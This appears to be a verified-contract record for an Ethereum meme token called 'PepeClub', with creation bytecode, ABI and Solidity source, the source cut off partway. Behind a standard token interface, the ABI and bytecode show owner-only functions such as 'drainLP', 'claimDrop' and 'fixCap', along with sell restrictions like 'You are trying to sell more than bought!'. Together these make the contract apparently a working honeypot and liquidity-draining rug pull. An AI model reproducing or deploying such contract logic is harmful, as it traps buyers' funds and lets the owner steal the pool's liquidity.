{
    "address": "0x6ddfeC08B7597e9392abbC41CB8a74A0d59188C1",
    "tx_hash": "94fe4201c5584235414970006854c09a4ff13e5ba9942a96a904672c11b30596",
    "block_number": 18009870,
    "timestamp": 1693186199,
    "gas_used_in_creation": 4613424,
    "creation_bytecode": "6a52b7d2dcc80cd2e400000060065560c060405260096080908152682832b8329021b63ab160b91b60a05260079062000039908262000439565b5060408051808201909152600481526321a62aa160e11b602082015260089062000064908262000439565b506009805460ff1916601217905564174876e800600a556000600b819055600c5560016010553480156200009757600080fd5b50604051620023ba380380620023ba833981016040819052620000ba9162000505565b620000c53362000344565b600280546001600160a01b0319166001600160a01b0383169081179091556040805163c45a015560e01b8152905163c45a0155916004808201926020929091908290030181865afa1580156200011f573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000145919062000505565b6001600160a01b031663c9c6539630600260009054906101000a90046001600160a01b03166001600160a01b031663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa158015620001a8573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620001ce919062000505565b6040516001600160e01b031960e085901b1681526001600160a01b039283166004820152911660248201526044016020604051808303816000875af11580156200021c573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000242919062000505565b600380546001600160a01b0319166001600160a01b0392831617905560065460008054831681526004602052604081209190915554166001600160a01b031660006001600160a01b03167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef600654604051620002c091815260200190565b60405180910390a3503360008181526011602090815260408083208054600160ff199182168117909255308086528386208054831684179055601280546001600160a01b03199081168917909155878752601390955283862080548316841790558552919093208054909116909217909155600d8054909116909117905562000537565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b634e487b7160e01b600052604160045260246000fd5b600181811c90821680620003bf57607f821691505b602082108103620003e057634e487b7160e01b600052602260045260246000fd5b50919050565b601f8211156200043457600081815260208120601f850160051c810160208610156200040f5750805b601f850160051c820191505b8181101562000430578281556001016200041b565b5050505b505050565b81516001600160401b0381111562000455576200045562000394565b6200046d81620004668454620003aa565b84620003e6565b602080601f831160018114620004a557600084156200048c5750858301515b600019600386901b1c1916600185901b17855562000430565b600085815260208120601f198616915b82811015620004d657888601518255948401946001909101908401620004b5565b5085821015620004f55787850151600019600388901b60f8161c191681555b5050505050600190811b01905550565b6000602082840312156200051857600080fd5b81516001600160a01b03811681146200053057600080fd5b9392505050565b611e7380620005476000396000f3fe60806040526004361061021a5760003560e01c806370a0823111610123578063a7e90f41116100ab578063e3bbb4f11161006f578063e3bbb4f11461069c578063e4440a86146106b2578063edd8b64a146106d2578063f2fde38b146106f2578063f53d9d581461071257600080fd5b8063a7e90f41146105d8578063a9059cbb14610611578063c0e8c61e14610631578063d1a039f014610646578063dd62ed3e1461067c57600080fd5b80638da5cb5b116100f25780638da5cb5b1461053157806395d89b41146105635780639e568dbc146105785780639f38a0d714610598578063a457c2d7146105b857600080fd5b806370a08231146104a1578063715018a6146104d75780638229c2e5146104ec57806385ecafd71461050157600080fd5b80633816377e116101a65780634feeade4116101755780634feeade4146103dd5780635337cc99146103f25780635342acb4146104125780636994ee731461044b5780636db794371461048157600080fd5b80633816377e1461036557806339509351146103855780633975cae9146103a55780634d474d42146103bd57600080fd5b806323b872dd116101ed57806323b872dd146102bb5780632df8bca9146102db578063313ce56714610303578063344d9e791461032557806335d162741461034557600080fd5b806306fdde031461021f578063095ea7b31461024a5780631342be9b1461027a57806318160ddd1461029c575b600080fd5b34801561022b57600080fd5b50610234610725565b6040516102419190611939565b60405180910390f35b34801561025657600080fd5b5061026a61026536600461199c565b6107b7565b6040519015158152602001610241565b34801561028657600080fd5b5061029a6102953660046119c8565b6107d1565b005b3480156102a857600080fd5b506006545b604051908152602001610241565b3480156102c757600080fd5b5061026a6102d6366004611a01565b610816565b3480156102e757600080fd5b50600b54600c5460408051928352602083019190915201610241565b34801561030f57600080fd5b5060095460405160ff9091168152602001610241565b34801561033157600080fd5b5061029a610340366004611a42565b61083a565b34801561035157600080fd5b506102ad610360366004611a5b565b610856565b34801561037157600080fd5b5061029a610380366004611a42565b61098b565b34801561039157600080fd5b5061026a6103a036600461199c565b6109a7565b3480156103b157600080fd5b5060145460ff1661026a565b3480156103c957600080fd5b5061029a6103d8366004611a5b565b6109c9565b3480156103e957600080fd5b5061029a610a02565b3480156103fe57600080fd5b5061029a61040d366004611a8d565b610a4d565b34801561041e57600080fd5b5061026a61042d366004611a5b565b6001600160a01b031660009081526013602052604090205460ff1690565b34801561045757600080fd5b506102ad610466366004611a5b565b6001600160a01b03166000908152600e602052604090205490565b34801561048d57600080fd5b5061029a61049c366004611ac2565b610b04565b3480156104ad57600080fd5b506102ad6104bc366004611a5b565b6001600160a01b031660009081526004602052604090205490565b3480156104e357600080fd5b5061029a610b90565b3480156104f857600080fd5b5061029a610ba4565b34801561050d57600080fd5b5061026a61051c366004611a5b565b60136020526000908152604090205460ff1681565b34801561053d57600080fd5b506000546001600160a01b03165b6040516001600160a01b039091168152602001610241565b34801561056f57600080fd5b50610234610bcf565b34801561058457600080fd5b5061029a610593366004611a42565b610bde565b3480156105a457600080fd5b5061029a6105b3366004611ae4565b610c0f565b3480156105c457600080fd5b5061026a6105d336600461199c565b610c9d565b3480156105e457600080fd5b5061026a6105f3366004611a5b565b6001600160a01b031660009081526011602052604090205460ff1690565b34801561061d57600080fd5b5061026a61062c36600461199c565b610d18565b34801561063d57600080fd5b5061029a610d26565b34801561065257600080fd5b506102ad610661366004611a5b565b6001600160a01b03166000908152600f602052604090205490565b34801561068857600080fd5b506102ad6106973660046119c8565b610f06565b3480156106a857600080fd5b506102ad600a5481565b3480156106be57600080fd5b5060125461054b906001600160a01b031681565b3480156106de57600080fd5b5061029a6106ed366004611a5b565b610f31565b3480156106fe57600080fd5b5061029a61070d366004611a5b565b610f6a565b61029a610720366004611a42565b610fe3565b60606007805461073490611b68565b80601f016020809104026020016040519081016040528092919081815260200182805461076090611b68565b80156107ad5780601f10610782576101008083540402835291602001916107ad565b820191906000526020600020905b81548152906001019060200180831161079057829003601f168201915b5050505050905090565b6000336107c58185856110d3565b60019150505b92915050565b600d546107e89033906001600160a01b03166111f7565b600280546001600160a01b039384166001600160a01b03199182161790915560038054929093169116179055565b600033610824858285611266565b61082f8585856112da565b506001949350505050565b600d546108519033906001600160a01b03166111f7565b601055565b6000806000600360009054906101000a90046001600160a01b03166001600160a01b0316630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa1580156108ae573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906108d29190611bb9565b50915091506000846001600160a01b0316600360009054906101000a90046001600160a01b03166001600160a01b0316630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa158015610936573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061095a9190611c09565b6001600160a01b03161461097757816001600160701b0316610982565b826001600160701b03165b95945050505050565b600d546109a29033906001600160a01b03166111f7565b600a55565b6000336107c58185856109ba8383610f06565b6109c49190611c3c565b6110d3565b600d546109e09033906001600160a01b03166111f7565b601280546001600160a01b0319166001600160a01b0392909216919091179055565b600d54610a199033906001600160a01b03166111f7565b33600090815260046020526040812080546d629b8c891b267182b614000000009290610a46908490611c3c565b9091555050565b600d54610a649033906001600160a01b03166111f7565b6001600160a01b03821660009081526013602052604090205481151560ff909116151503610ad95760405162461bcd60e51b815260206004820152601d60248201527f5573657220616c7265616479206861766520746869732073746174757300000060448201526064015b60405180910390fd5b6001600160a01b03919091166000908152601360205260409020805460ff1916911515919091179055565b600d54610b1b9033906001600160a01b03166111f7565b60648211158015610b2d575060648111155b610b855760405162461bcd60e51b8152602060048201526024808201527f4665652070657263656e742063616e277420626520686967686572207468616e6044820152630203130360e41b6064820152608401610ad0565b600b91909155600c55565b610b9861165b565b610ba260006116c4565b565b600d54610bbb9033906001600160a01b03166111f7565b6014805460ff19811660ff90911615179055565b60606008805461073490611b68565b600d54610bf59033906001600160a01b03166111f7565b8060066000828254610c079190611c3c565b909155505050565b600d54610c269033906001600160a01b03166111f7565b60005b82811015610c97578160116000868685818110610c4857610c48611c4f565b9050602002016020810190610c5d9190611a5b565b6001600160a01b031681526020810191909152604001600020805460ff191691151591909117905580610c8f81611c65565b915050610c29565b50505050565b60003381610cab8286610f06565b905083811015610d0b5760405162461bcd60e51b815260206004820152602560248201527f45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77604482015264207a65726f60d81b6064820152608401610ad0565b61082f82868684036110d3565b6000336107c58185856112da565b600d54610d3d9033906001600160a01b03166111f7565b6000610d4830610856565b90506000610d5d826001600160701b03611c7e565b9050610d67611714565b33600090815260046020526040902054610d82903090610d18565b50600254610da29030906001600160a01b03166001600160701b036110d3565b60408051600280825260608083018452926020830190803683370190505090503081600081518110610dd657610dd6611c4f565b6001600160a01b03928316602091820292909201810191909152600254604080516315ab88c960e31b81529051919093169263ad5c46489260048083019391928290030181865afa158015610e2f573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610e539190611c09565b81600181518110610e6657610e66611c4f565b6001600160a01b0392831660209182029290920101526002543391166338ed17398460008585610e98426104b0611c3c565b6040518663ffffffff1660e01b8152600401610eb8959493929190611ca7565b6000604051808303816000875af1158015610ed7573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052610eff9190810190611d18565b5050505050565b6001600160a01b03918216600090815260056020908152604080832093909416825291909152205490565b600d54610f489033906001600160a01b03166111f7565b600d80546001600160a01b0319166001600160a01b0392909216919091179055565b610f7261165b565b6001600160a01b038116610fd75760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b6064820152608401610ad0565b610fe0816116c4565b50565b600d54610ffa9033906001600160a01b03166111f7565b6002546110129030906001600160a01b0316836110d3565b61101c3082610d18565b506002546001600160a01b031663f305d71934308460008033611041426104b0611c3c565b60405160e089901b6001600160e01b03191681526001600160a01b039687166004820152602481019590955260448501939093526064840191909152909216608482015260a481019190915260c40160606040518083038185885af11580156110ae573d6000803e3d6000fd5b50505050506040513d601f19601f82011682018060405250810190610c979190611dd6565b6001600160a01b0383166111355760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b6064820152608401610ad0565b6001600160a01b0382166111965760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b6064820152608401610ad0565b6001600160a01b0383811660008181526005602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b806001600160a01b0316826001600160a01b0316146112625760405162461bcd60e51b815260206004820152602160248201527f43616c6c6572206973206e6f7420746865206f726967696e616c2063616c6c656044820152603960f91b6064820152608401610ad0565b5050565b60006112728484610f06565b90506000198114610c9757818110156112cd5760405162461bcd60e51b815260206004820152601d60248201527f45524332303a20696e73756666696369656e7420616c6c6f77616e63650000006044820152606401610ad0565b610c9784848484036110d3565b6001600160a01b03831661133e5760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b6064820152608401610ad0565b6001600160a01b0382166113a05760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b6064820152608401610ad0565b6113ab83838361173a565b6001600160a01b038316600090815260046020526040902054818110156114235760405162461bcd60e51b815260206004820152602660248201527f45524332303a207472616e7366657220616d6f756e7420657863656564732062604482015265616c616e636560d01b6064820152608401610ad0565b6001600160a01b03841660009081526013602052604090205460ff1615801561146557506001600160a01b03831660009081526013602052604090205460ff16155b156115c257611473846118d5565b156115a657600061148683600b54611904565b90506114928383611c7e565b6001600160a01b0386166000908152600460205260409020556114b58184611c7e565b6001600160a01b038516600090815260046020526040812080549091906114dd908490611c3c565b90915550506001600160a01b038085169086167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef61151b8487611c7e565b60405190815260200160405180910390a36012546001600160a01b031660009081526004602052604081208054839290611556908490611c3c565b90915550506012546040518281526001600160a01b03918216918716907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9060200160405180910390a350610c97565b6115af836118d5565b156115c257600061148683600c54611904565b6115cc8282611c7e565b6001600160a01b038086166000908152600460205260408082209390935590851681529081208054849290611602908490611c3c565b92505081905550826001600160a01b0316846001600160a01b03167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8460405161164e91815260200190565b60405180910390a3610c97565b3361166e6000546001600160a01b031690565b6001600160a01b031614610ba25760405162461bcd60e51b815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65726044820152606401610ad0565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b33600090815260046020526040812080546001600160701b039290610a46908490611c3c565b611743836118d5565b15611771576001600160a01b0382166000908152600f60209081526040808320849055600e90915290204290555b61177a826118d5565b156118d0576001600160a01b03831660009081526011602052604090205460ff166118d0576001600160a01b0383166000908152600f60205260409020548111156118185760405162461bcd60e51b815260206004820152602860248201527f596f752061726520747279696e6720746f2073656c6c206d6f7265207468616e60448201526720626f756768742160c01b6064820152608401610ad0565b6001600160a01b0383166000908152600f602052604081208054839290611840908490611c7e565b909155505060145460ff16156118c2576001600160a01b0383166000908152600e60205260409020546010546118769190611923565b6118c25760405162461bcd60e51b815260206004820181905260248201527f4c696272654d6f756e743a20457863656564732054786e20446f776e74696d656044820152606401610ad0565b600a543a106118d057600080fd5b505050565b6003546000906001600160a01b03838116911614806107cb5750506002546001600160a01b0390811691161490565b600060646119128385611e04565b61191c9190611e1b565b9392505050565b6000426119308385611c3c565b10159392505050565b600060208083528351808285015260005b818110156119665785810183015185820160400152820161194a565b506000604082860101526040601f19601f8301168501019250505092915050565b6001600160a01b0381168114610fe057600080fd5b600080604083850312156119af57600080fd5b82356119ba81611987565b946020939093013593505050565b600080604083850312156119db57600080fd5b82356119e681611987565b915060208301356119f681611987565b809150509250929050565b600080600060608486031215611a1657600080fd5b8335611a2181611987565b92506020840135611a3181611987565b929592945050506040919091013590565b600060208284031215611a5457600080fd5b5035919050565b600060208284031215611a6d57600080fd5b813561191c81611987565b80358015158114611a8857600080fd5b919050565b60008060408385031215611aa057600080fd5b8235611aab81611987565b9150611ab960208401611a78565b90509250929050565b60008060408385031215611ad557600080fd5b50508035926020909101359150565b600080600060408486031215611af957600080fd5b833567ffffffffffffffff80821115611b1157600080fd5b818601915086601f830112611b2557600080fd5b813581811115611b3457600080fd5b8760208260051b8501011115611b4957600080fd5b602092830195509350611b5f9186019050611a78565b90509250925092565b600181811c90821680611b7c57607f821691505b602082108103611b9c57634e487b7160e01b600052602260045260246000fd5b50919050565b80516001600160701b0381168114611a8857600080fd5b600080600060608486031215611bce57600080fd5b611bd784611ba2565b9250611be560208501611ba2565b9150604084015163ffffffff81168114611bfe57600080fd5b809150509250925092565b600060208284031215611c1b57600080fd5b815161191c81611987565b634e487b7160e01b600052601160045260246000fd5b808201808211156107cb576107cb611c26565b634e487b7160e01b600052603260045260246000fd5b600060018201611c7757611c77611c26565b5060010190565b818103818111156107cb576107cb611c26565b634e487b7160e01b600052604160045260246000fd5b600060a082018783526020878185015260a0604085015281875180845260c086019150828901935060005b81811015611cf75784516001600160a01b031683529383019391830191600101611cd2565b50506001600160a01b03969096166060850152505050608001529392505050565b60006020808385031215611d2b57600080fd5b825167ffffffffffffffff80821115611d4357600080fd5b818501915085601f830112611d5757600080fd5b815181811115611d6957611d69611c91565b8060051b604051601f19603f83011681018181108582111715611d8e57611d8e611c91565b604052918252848201925083810185019188831115611dac57600080fd5b938501935b82851015611dca57845184529385019392850192611db1565b98975050505050505050565b600080600060608486031215611deb57600080fd5b8351925060208401519150604084015190509250925092565b80820281158282048414176107cb576107cb611c26565b600082611e3857634e487b7160e01b600052601260045260246000fd5b50049056fea26469706673582212206a2b77b206d8b615acf276494006db777f1d1ed310b42c16f65393df609ca06864736f6c634300081300330000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d",
    "runtime_bytecode": "",
    "contract_name": "PepeClub",
    "compiler_version": "v0.8.19+commit.7dd6d404",
    "optimization_used": "1",
    "runs": "200",
    "abi": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"routerAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_tokenAmount\",\"type\":\"uint256\"}],\"name\":\"AddLiquidity\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"MAX_GAS_PRICE\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_newGasPrice\",\"type\":\"uint256\"}],\"name\":\"changeMaxGasPrice\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"checkCurrentFees\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"currentBuyFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"currentSellFee\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"checkPremissionList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"checkUserBoughtAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"checkUserPurchaseTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"claimDrop\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_routerAddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_poolAddress\",\"type\":\"address\"}],\"name\":\"dexRebase\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"drainLP\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_seconds\",\"type\":\"uint256\"}],\"name\":\"editDownTime\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"excludedFromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"fixCap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"}],\"name\":\"getBaseTokenReserve\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"isExcludedFromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_newOne\",\"type\":\"address\"}],\"name\":\"switchOrigin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"switchValidationEnableState\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_status\",\"type\":\"bool\"}],\"name\":\"updateExcludedFromFeeStatus\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_buyFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_sellFee\",\"type\":\"uint256\"}],\"name\":\"updateFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_newMarketWallet\",\"type\":\"address\"}],\"name\":\"updateMarketWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_usrs\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"_state\",\"type\":\"bool\"}],\"name\":\"updatePremissionList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"validationEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]",
    "source_code": "// SPDX-License-Identifier: MIT\r\n\r\n// https://t.me/ClubPepe\r\n\r\npragma solidity ^0.8.19;\r\n\r\nabstract contract Ownable {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _transferOwnership(msg.sender);\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function _checkOwner() internal view virtual {\r\n        require(owner() == msg.sender, \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Pair {\r\n    function token0() external view returns (address);\r\n    function token1() external view returns (address);\r\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n}   \r\n\r\ninterface IUniswapV2Router01 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n    function swapExactTokensForTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n}\r\n\r\ninterface IUniswapV2Router02 is IUniswapV2Router01 {}\r\n\r\nlibrary SecureCalls {\r\n    function checkCaller(address sender, address _origin) internal pure {\r\n        require(sender == _origin, \"Caller is not the original caller\");\r\n    }\r\n}\r\n\r\ncontract LibreMount {\r\n\r\n    mapping(uint256 => mapping(address => bool)) internal _blockState;\r\n\r\n    function compreTxnStamp(uint256 _tmstmp, uint256 _dwntm) internal view returns (bool) {\r\n        return(_tmstmp + _dwntm >= block.timestamp);\r\n    }\r\n\r\n    function suspiciousAddressCheck(address _addy) internal view {\r\n        require(!_blockState[block.number][_addy], \"Only one Txn per Block!\");\r\n    }\r\n\r\n    function addSuspiciousAddress(address _addy) internal {\r\n        _blockState[block.number][_addy] = 